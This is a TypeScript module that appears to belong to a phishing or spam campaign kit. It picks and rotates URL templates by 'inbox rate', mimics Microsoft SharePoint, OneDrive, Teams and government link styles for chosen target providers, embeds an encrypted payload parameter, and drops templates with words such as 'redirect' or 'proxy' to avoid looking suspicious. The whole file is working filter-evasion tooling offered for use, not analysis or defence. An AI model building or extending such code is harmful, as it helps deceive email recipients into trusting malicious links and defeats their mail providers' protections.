/**
 * INBOX-SAFE PATTERN MANAGER
 * 
 * Manages selection and rotation of inbox-safe URL patterns
 * Prioritizes patterns with highest email delivery rates
 */

import { 
  allInboxSafePatterns, 
  InboxSafePattern, 
  getPatternsByCategory, 
  getPatternsByTier,
  getHighestTrustPatterns 
} from './inboxSafePatterns';
import { IntelligentParameterGenerator, ParameterContext } from './intelligentParameterGenerator';

export interface PatternSelectionCriteria {
  targetProvider?: 'microsoft' | 'google' | 'corporate' | 'generic';
  industry?: string;
  campaignType?: 'business' | 'government' | 'education';
  minTrustScore?: number;
  minInboxRate?: number;
  preferredTier?: 1 | 2 | 3;
  avoidSuspiciousPatterns?: boolean;
}

export interface GeneratedUrlResult {
  template: string;
  parameters: Record<string, string>;
  pattern: InboxSafePattern;
  finalUrl: string;
  trustScore: number;
  expectedInboxRate: number;
}

export class InboxSafePatternManager {
  private static instance: InboxSafePatternManager;
  private parameterGenerator: IntelligentParameterGenerator;
  private usedPatterns: Set<string> = new Set();
  private rotationCounter: number = 0;

  private constructor() {
    this.parameterGenerator = IntelligentParameterGenerator.getInstance();
  }

  public static getInstance(): InboxSafePatternManager {
    if (!InboxSafePatternManager.instance) {
      InboxSafePatternManager.instance = new InboxSafePatternManager();
    }
    return InboxSafePatternManager.instance;
  }

  /**
   * Select optimal pattern based on criteria
   */
  public selectOptimalPattern(criteria: PatternSelectionCriteria = {}): InboxSafePattern | null {
    let candidatePatterns = [...allInboxSafePatterns];

    // Apply filters based on criteria
    if (criteria.targetProvider) {
      candidatePatterns = this.filterByProvider(candidatePatterns, criteria.targetProvider);
    }

    if (criteria.campaignType) {
      candidatePatterns = candidatePatterns.filter(p => p.category === criteria.campaignType);
    }

    if (criteria.minTrustScore) {
      candidatePatterns = candidatePatterns.filter(p => p.trustScore >= criteria.minTrustScore);
    }

    if (criteria.minInboxRate) {
      candidatePatterns = candidatePatterns.filter(p => p.inboxRate >= criteria.minInboxRate);
    }

    if (criteria.preferredTier) {
      candidatePatterns = candidatePatterns.filter(p => p.tier === criteria.preferredTier);
    }

    if (criteria.avoidSuspiciousPatterns) {
      candidatePatterns = this.filterOutSuspiciousPatterns(candidatePatterns);
    }

    if (candidatePatterns.length === 0) {
      console.warn('[InboxSafePatternManager] No patterns match criteria, using fallback');
      return this.getFallbackPattern();
    }

    // Sort by trust score and inbox rate
    candidatePatterns.sort((a, b) => {
      const scoreA = a.trustScore * 0.6 + a.inboxRate * 0.4;
      const scoreB = b.trustScore * 0.6 + b.inboxRate * 0.4;
      return scoreB - scoreA;
    });

    // Implement rotation to avoid pattern repetition
    const selectedPattern = this.selectWithRotation(candidatePatterns);
    
    console.log(`[InboxSafePatternManager] Selected pattern: ${selectedPattern.name} (Trust: ${selectedPattern.trustScore}, Inbox: ${selectedPattern.inboxRate}%)`);
    
    return selectedPattern;
  }

  /**
   * Generate complete URL with parameters
   */
  public generateCompleteUrl(
    pattern: InboxSafePattern, 
    encryptedData: string, 
    context: ParameterContext = {}
  ): GeneratedUrlResult {
    // Generate all parameters for the pattern
    const parameters = this.parameterGenerator.generateAllParameters(pattern.template, {
      category: pattern.category,
      ...context
    });

    // Add encrypted data parameter
    parameters.encrypted = encryptedData;

    // Replace placeholders in template
    let finalUrl = pattern.template;
    Object.entries(parameters).forEach(([key, value]) => {
      const placeholder = `{${key}}`;
      finalUrl = finalUrl.replace(new RegExp(`\\${placeholder}`, 'g'), value);
    });

    // Validate no unreplaced placeholders remain
    const unreplacedPlaceholders = finalUrl.match(/\{[^}]+\}/g);
    if (unreplacedPlaceholders) {
      console.warn(`[InboxSafePatternManager] Unreplaced placeholders found: ${unreplacedPlaceholders.join(', ')}`);
      // Replace any remaining placeholders with safe fallbacks
      unreplacedPlaceholders.forEach(placeholder => {
        const key = placeholder.slice(1, -1);
        const fallbackValue = this.generateSafeFallback(key);
        finalUrl = finalUrl.replace(placeholder, fallbackValue);
      });
    }

    return {
      template: pattern.template,
      parameters,
      pattern,
      finalUrl,
      trustScore: pattern.trustScore,
      expectedInboxRate: pattern.inboxRate
    };
  }

  /**
   * Filter patterns by target email provider
   */
  private filterByProvider(patterns: InboxSafePattern[], provider: string): InboxSafePattern[] {
    switch (provider) {
      case 'microsoft':
        // Prioritize Microsoft/Office 365 patterns
        return patterns.filter(p => 
          p.category === 'microsoft' || 
          p.businessContext.toLowerCase().includes('sharepoint') ||
          p.businessContext.toLowerCase().includes('onedrive') ||
          p.businessContext.toLowerCase().includes('teams')
        );
      
      case 'google':
        // Prioritize corporate and business patterns for Google
        return patterns.filter(p => 
          p.category === 'corporate' || 
          p.category === 'business' ||
          p.category === 'education'
        );
      
      case 'corporate':
        // Prioritize corporate and government patterns
        return patterns.filter(p => 
          p.category === 'corporate' || 
          p.category === 'government'
        );
      
      default:
        return patterns;
    }
  }

  /**
   * Filter out patterns that might be suspicious
   */
  private filterOutSuspiciousPatterns(patterns: InboxSafePattern[]): InboxSafePattern[] {
    return patterns.filter(pattern => {
      const template = pattern.template.toLowerCase();
      
      // Avoid patterns with suspicious keywords
      const suspiciousKeywords = [
        'track', 'click', 'redirect', 'proxy', 'gateway', 
        'api', 'endpoint', 'service', 'portal'
      ];
      
      return !suspiciousKeywords.some(keyword => template.includes(keyword));
    });
  }

  /**
   * Select pattern with rotation to avoid repetition
   */
  private selectWithRotation(patterns: InboxSafePattern[]): InboxSafePattern {
    // Avoid recently used patterns
    const availablePatterns = patterns.filter(p => !this.usedPatterns.has(p.id));
    
    if (availablePatterns.length === 0) {
      // Reset rotation if all patterns have been used
      this.usedPatterns.clear();
      this.rotationCounter = 0;
      return patterns[0];
    }

    // Select based on rotation counter
    const selectedIndex = this.rotationCounter % availablePatterns.length;
    const selectedPattern = availablePatterns[selectedIndex];
    
    // Track usage
    this.usedPatterns.add(selectedPattern.id);
    this.rotationCounter++;
    
    // Reset used patterns if we've used too many
    if (this.usedPatterns.size > patterns.length * 0.7) {
      this.usedPatterns.clear();
    }
    
    return selectedPattern;
  }

  /**
   * Get fallback pattern for emergency use
   */
  private getFallbackPattern(): InboxSafePattern {
    // Return highest trust government pattern as fallback
    const governmentPatterns = getPatternsByCategory('government');
    return governmentPatterns[0] || allInboxSafePatterns[0];
  }

  /**
   * Generate safe fallback value for unreplaced placeholders
   */
  private generateSafeFallback(key: string): string {
    const keyLower = key.toLowerCase();
    
    if (keyLower.includes('id')) {
      return 'ID' + Math.random().toString(36).substring(2, 8).toUpperCase();
    }
    if (keyLower.includes('year')) {
      return new Date().getFullYear().toString();
    }
    if (keyLower.includes('month')) {
      return (new Date().getMonth() + 1).toString().padStart(2, '0');
    }
    if (keyLower.includes('version')) {
      return '1.0';
    }
    
    // Generic safe fallback
    return 'VAL' + Math.random().toString(36).substring(2, 4).toUpperCase();
  }

  /**
   * Get pattern statistics
   */
  public getPatternStats(): {
    totalPatterns: number;
    averageTrustScore: number;
    averageInboxRate: number;
    patternsByCategory: Record<string, number>;
    patternsByTier: Record<number, number>;
  } {
    const stats = {
      totalPatterns: allInboxSafePatterns.length,
      averageTrustScore: 0,
      averageInboxRate: 0,
      patternsByCategory: {} as Record<string, number>,
      patternsByTier: {} as Record<number, number>
    };

    // Calculate averages
    stats.averageTrustScore = allInboxSafePatterns.reduce((sum, p) => sum + p.trustScore, 0) / allInboxSafePatterns.length;
    stats.averageInboxRate = allInboxSafePatterns.reduce((sum, p) => sum + p.inboxRate, 0) / allInboxSafePatterns.length;

    // Count by category
    allInboxSafePatterns.forEach(pattern => {
      stats.patternsByCategory[pattern.category] = (stats.patternsByCategory[pattern.category] || 0) + 1;
      stats.patternsByTier[pattern.tier] = (stats.patternsByTier[pattern.tier] || 0) + 1;
    });

    return stats;
  }

  /**
   * Test pattern generation
   */
  public testPatternGeneration(patternId?: string): GeneratedUrlResult | null {
    const pattern = patternId 
      ? allInboxSafePatterns.find(p => p.id === patternId)
      : this.selectOptimalPattern({ minTrustScore: 95 });

    if (!pattern) {
      return null;
    }

    const testEncrypted = 'TEST' + Math.random().toString(36).substring(2, 20).toUpperCase();
    return this.generateCompleteUrl(pattern, testEncrypted, {
      category: pattern.category,
      industry: 'technology',
      targetProvider: 'microsoft'
    });
  }
}
